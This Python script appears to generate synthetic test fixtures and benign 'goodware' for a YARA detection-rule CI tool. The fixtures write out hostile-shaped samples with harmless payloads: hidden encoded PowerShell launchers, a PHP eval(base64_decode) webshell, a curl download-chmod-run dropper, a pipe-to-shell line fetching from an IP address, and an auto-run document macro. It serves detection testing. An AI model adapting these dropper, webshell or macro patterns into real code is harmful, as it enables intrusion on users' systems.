"""Generate the example fixtures and bundled goodware deterministically.

Every byte under ``examples/pack-v*/fixtures`` and ``examples/goodware`` is
produced by this script, so the provenance of each test file is reviewable
here. All samples are synthetic and benign: binary "PE", "ELF" and "OLE" files
are header stubs that carry marker strings but contain no executable code, and
every URL uses the reserved ``.invalid`` / ``example`` names that never resolve.

Usage::

    uv run python scripts/make_examples.py           # (re)write files
    uv run python scripts/make_examples.py --check   # exit 1 if files are stale
"""

from __future__ import annotations

import argparse
import base64
import random
import struct
import sys
from collections.abc import Callable
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
EXAMPLES = ROOT / "examples"

LAB = "yaraci lab fixture - synthetic and benign"


# --------------------------------------------------------------------------- binary stubs
def pe_stub(sections: list[bytes], payload: bytes = b"") -> bytes:
    """A 1 KiB PE-shaped header stub: MZ, e_lfanew, PE signature, COFF and section names."""
    buf = bytearray(1024)
    buf[0:2] = b"MZ"
    struct.pack_into("<I", buf, 0x3C, 0x80)
    buf[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", buf, 0x84, 0x8664, len(sections), 0x67000000, 0, 0, 0, 0x0022)
    for idx, name in enumerate(sections):
        off = 0x98 + 40 * idx
        buf[off : off + 8] = name.ljust(8, b"\0")
    buf[0x200 : 0x200 + len(payload)] = payload
    return bytes(buf)


def elf_stub(payload: bytes) -> bytes:
    """A 64-bit little-endian ELF identification header followed by a data blob."""
    header = bytearray(64)
    header[0:4] = b"\x7fELF"
    header[4], header[5], header[6] = 2, 1, 1  # ELFCLASS64, ELFDATA2LSB, EV_CURRENT
    struct.pack_into("<HHI", header, 16, 2, 0x3E, 1)  # ET_EXEC, x86-64, version
    return bytes(header) + b"\0" * 192 + payload


def ole_stub(payload: bytes) -> bytes:
    """OLE2 signature + zeroed header sector + payload (not a valid compound file)."""
    return bytes.fromhex("D0CF11E0A1B11AE1") + b"\0" * 504 + payload


def ps_encoded(text: str) -> str:
    return base64.b64encode(text.encode("utf-16-le")).decode("ascii")


# --------------------------------------------------------------------------- fixtures
PS_PAYLOAD = ps_encoded("Write-Output 'yaraci lab fixture'")
PS_PAYLOAD_SHORT = ps_encoded("Get-Date | Out-File C:\\Temp\\yaraci-lab.txt")
PS_MATCH = (
    f"# {LAB}\r\n# The encoded command decodes to: Write-Output 'yaraci lab fixture'\r\n"
    f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {PS_PAYLOAD}\r\n"
).encode()
PS_MATCH_SHORT = f"# {LAB}\r\nPowerShell -w hidden -enc {PS_PAYLOAD_SHORT}\r\n".encode()
PS_NOMATCH = (
    f"# {LAB}\r\n# Scheduled maintenance task: no encoded payload\r\n"
    "powershell.exe -NoProfile -WindowStyle Hidden -File C:\\Scripts\\rotate-logs.ps1\r\n"
).encode()

PHP_MATCH = (
    f'<?php\n// {LAB}\n// decodes to: echo "yaraci lab fixture";\n'
    f"eval(base64_decode('{base64.b64encode(b'echo "yaraci lab fixture";').decode()}'));\n"
).encode()
PHP_NOMATCH = (
    f"<?php\n// {LAB}\n// Decoding user data is fine; evaluating it is not.\n"
    "$profile = json_decode(base64_decode($_COOKIE['profile'] ?? ''), true);\n"
    "echo htmlspecialchars($profile['name'] ?? 'guest');\n"
).encode()

SH_MATCH = (
    f"#!/bin/sh\n# {LAB}; the host name is reserved and never resolves\n"
    "curl -fsSL https://updates.example.invalid/agent -o /tmp/agent\n"
    "chmod +x /tmp/agent\nnohup /tmp/agent >/dev/null 2>&1 &\n"
).encode()
SH_NOMATCH = (
    f"#!/bin/sh\n# {LAB}: downloads a checksum file, verifies, never executes from /tmp\n"
    "curl -fsSL https://releases.example.invalid/tool.tar.gz -o /tmp/tool.tar.gz\n"
    'sha256sum -c tool.tar.gz.sha256 && tar -xzf /tmp/tool.tar.gz -C "$HOME/.local"\n'
).encode()
PIPE_MATCH = f"#!/bin/sh\n# {LAB}\ncurl -s http://203.0.113.10/x.sh | bash\n".encode()

UPX_PAYLOAD = b"$Info: This file is packed with the UPX executable packer $\0UPX!\x0d\x0a"
UPX_MATCH = pe_stub([b"UPX0", b"UPX1", b".rsrc"], UPX_PAYLOAD)
UPX_NOMATCH_PLAIN_PE = pe_stub([b".text", b".rdata", b".data"], b"plain stub, not packed\0")
UPX_NOMATCH_TEXT = (
    f"{LAB}\nRelease notes: binaries are no longer packed (UPX0/UPX1 sections and UPX! removed).\n".encode()
)

MINER_PAYLOAD = (
    b'{"pools":[{"url":"stratum+tcp://pool.example.invalid:3333","user":"lab"}],'
    b'"randomx":{"mode":"light"},"max-cpu-usage":50}\0--donate-level=1\0'
)
MINER_MATCH = elf_stub(MINER_PAYLOAD)
MINER_NOMATCH_JSON = MINER_PAYLOAD.rstrip(b"\0")  # same text, but not an ELF file
MINER_NOMATCH_ELF = elf_stub(b"stratum+tcp://pool.example.invalid:3333\0no tuning options here\0")

OLE_MACRO = (
    b'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n'
    b'    Set sh = CreateObject("WScript.Shell")\r\n    sh.Run "notepad.exe"\r\nEnd Sub\r\n'
)
OLE_MATCH = ole_stub(OLE_MACRO)
OLE_NOMATCH = ole_stub(
    b'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n    MsgBox "hello"\r\nEnd Sub\r\n'
)

RANSOM_MATCH = (
    f"{LAB.upper()}\n\nYOUR FILES HAVE BEEN ENCRYPTED by the tabletop exercise.\n"
    "To obtain the decryptor, send 0.0 bitcoin to the training wallet and visit\n"
    "http://exerciseexampleexampleexample.onion/lab\nDo not rename encrypted files.\n"
).encode()
RANSOM_NOMATCH = (
    f"# {LAB}\n# wallet-lib\n\nA small library for bitcoin wallets. Keys are stored encrypted;\n"
    "the decryptor helper needs your private key and never leaves your machine.\n"
).encode()


def fixtures_v1() -> dict[str, bytes]:
    return {
        "SUSP_PS_EncodedCommand_Hidden/match/launcher.ps1": PS_MATCH,
        "SUSP_PS_EncodedCommand_Hidden/match/short-flags.ps1": PS_MATCH_SHORT,
        "SUSP_PS_EncodedCommand_Hidden/nomatch/maintenance.ps1": PS_NOMATCH,
        "MAL_Webshell_PHP_EvalBase64/match/shell.php": PHP_MATCH,
        "MAL_Webshell_PHP_EvalBase64/nomatch/profile.php": PHP_NOMATCH,
        "SUSP_SH_Dropper_CurlChmodExec/match/dropper.sh": SH_MATCH,
        "SUSP_SH_Dropper_CurlChmodExec/nomatch/verified-install.sh": SH_NOMATCH,
        "PUA_PE_Packer_UPX/match/packed.exe.bin": UPX_MATCH,
        "PUA_PE_Packer_UPX/nomatch/plain.exe.bin": UPX_NOMATCH_PLAIN_PE,
        "PUA_PE_Packer_UPX/nomatch/release-notes.txt": UPX_NOMATCH_TEXT,
        "MAL_ELF_CoinMiner_Stratum/match/miner.elf.bin": MINER_MATCH,
        "MAL_ELF_CoinMiner_Stratum/nomatch/config.json": MINER_NOMATCH_JSON,
        "MAL_ELF_CoinMiner_Stratum/nomatch/pool-only.elf.bin": MINER_NOMATCH_ELF,
        "MAL_Doc_OLE_AutoOpenShell/match/invoice.doc.bin": OLE_MATCH,
        "MAL_Doc_OLE_AutoOpenShell/nomatch/msgbox.doc.bin": OLE_NOMATCH,
        "MAL_RansomNote_Generic/match/README_RESTORE.txt": RANSOM_MATCH,
        "MAL_RansomNote_Generic/nomatch/wallet-lib-README.txt": RANSOM_NOMATCH,
    }


def fixtures_v2() -> dict[str, bytes]:
    files = {}
    for rel, data in fixtures_v1().items():
        if rel.startswith("MAL_Doc_OLE_AutoOpenShell/"):
            continue  # rule removed in v2
        files[rel.replace("MAL_ELF_CoinMiner_Stratum/", "MAL_ELF_Miner_Stratum/")] = data
    files["SUSP_SH_PipeToShell/match/stage.sh"] = PIPE_MATCH
    return files


# --------------------------------------------------------------------------- goodware
def _icon_module() -> bytes:
    rng = random.Random(7)
    blob = base64.b64encode(bytes(rng.randrange(256) for _ in range(900))).decode()
    return (
        f'"""{LAB}: application icon embedded as base64 (pretend PNG bytes)."""\n\n'
        f'ICON_PNG_B64 = "{blob}"\n\n\ndef icon_bytes() -> bytes:\n'
        "    import base64\n\n    return base64.b64decode(ICON_PNG_B64)\n"
    ).encode()


def goodware() -> dict[str, bytes]:
    rng = random.Random(2026)
    files: dict[str, bytes] = {
        "scripts/install-tool.sh": (
            f"#!/bin/sh\n# {LAB}: the usual 'curl | sh' installer one-liner from a README\n"
            "set -eu\necho 'Installing exampletool'\n"
            "curl -fsSL https://sh.example.invalid/install.sh | sh -s -- --yes\n"
        ).encode(),
        "scripts/backup.ps1": (
            f"# {LAB}\r\nparam([string]$Target = 'D:\\Backup')\r\n"
            "Get-ChildItem -Path $env:USERPROFILE\\Documents -Recurse |\r\n"
            "  Copy-Item -Destination $Target -Force\r\nWrite-Output 'backup complete'\r\n"
        ).encode(),
        "scripts/deploy.sh": (
            f"#!/bin/sh\n# {LAB}\nset -e\n"
            "wget -q https://artifacts.example.invalid/app.tar.gz -O /tmp/app.tar.gz\n"
            "tar -xzf /tmp/app.tar.gz -C /opt/app\nchmod 755 /opt/app/bin/app\nsystemctl restart app\n"
        ).encode(),
        "web/index.php": (
            f"<?php\n// {LAB}\n$items = json_decode(file_get_contents('items.json'), true);\n"
            "foreach ($items as $item) { echo '<li>' . htmlspecialchars($item['name']) . '</li>'; }\n"
        ).encode(),
        "web/token.php": (
            f"<?php\n// {LAB}\nfunction decode_token(string $t): array {{\n"
            "    return json_decode(base64_decode(strtr($t, '-_', '+/')), true) ?? [];\n}\n"
        ).encode(),
        "docs/crypto-wallet-guide.md": (
            f"<!-- {LAB} -->\n# Wallet guide\n\n"
            "This guide explains how bitcoin wallets keep your private key safe.\n"
            "Backups are encrypted; the recovery tool (the *decryptor*) restores them offline.\n"
            "Some users run nodes as Tor hidden services (.onion addresses).\n"
        ).encode(),
        "docs/CHANGELOG.md": (
            f"<!-- {LAB} -->\n# Changelog\n\n## 2.1.0\n- Release binaries are no longer UPX-packed.\n"
            "- Mining-pool examples moved to docs (stratum+tcp:// URLs are placeholders).\n"
        ).encode(),
        "config/app.json": b'{"name": "demo", "workers": 4, "log_level": "info", "features": ["a", "b"]}\n',
        "config/nginx.conf": (
            f"# {LAB}\nserver {{\n  listen 80;\n  location / {{ proxy_pass http://127.0.0.1:8080; }}\n}}\n"
        ).encode(),
        "src/app_icon.py": _icon_module(),
        "src/util.py": (
            f'"""{LAB}."""\n\nimport subprocess\n\n\ndef git_rev() -> str:\n'
            '    return subprocess.run(["git", "rev-parse", "HEAD"], capture_output=True, text=True)'
            ".stdout.strip()\n"
        ).encode(),
        "bin/tool.exe.bin": pe_stub([b".text", b".rdata", b".data", b".reloc"], b"Example Tool 1.0\0"),
        "bin/libdemo.so.bin": elf_stub(b"libdemo.so.1\0demo_init\0demo_free\0GLIBC_2.34\0"),
        "bin/report.doc.bin": ole_stub(b"Quarterly report\0Author\0Summary\0"),
    }
    for idx in range(4):
        files[f"blobs/random-{idx}.bin"] = rng.randbytes(256 * 1024)
    text_words = ["alpha", "bravo", "delta", "omega", "kernel", "config", "socket", "buffer", "token"]
    lines = [" ".join(rng.choice(text_words) for _ in range(12)) for _ in range(6000)]
    files["blobs/log-text.txt"] = ("\n".join(lines) + "\n").encode()
    return files


TARGETS: dict[Path, Callable[[], dict[str, bytes]]] = {
    EXAMPLES / "pack-v1" / "fixtures": fixtures_v1,
    EXAMPLES / "pack-v2" / "fixtures": fixtures_v2,
    EXAMPLES / "goodware": goodware,
}


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--check", action="store_true", help="only verify files are up to date")
    args = parser.parse_args(argv)
    stale: list[str] = []
    for base, build in TARGETS.items():
        expected = build()
        existing = (
            {p.relative_to(base).as_posix() for p in base.rglob("*") if p.is_file()}
            if base.exists()
            else set()
        )
        for rel, data in expected.items():
            path = base / rel
            if not path.exists() or path.read_bytes() != data:
                stale.append(str(path.relative_to(ROOT)))
                if not args.check:
                    path.parent.mkdir(parents=True, exist_ok=True)
                    path.write_bytes(data)
        for rel in sorted(existing - set(expected)):
            stale.append(f"{(base / rel).relative_to(ROOT)} (unexpected)")
    if args.check:
        for item in stale:
            print(f"stale: {item}")
        return 1 if stale else 0
    print(f"wrote {len(stale)} file(s)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
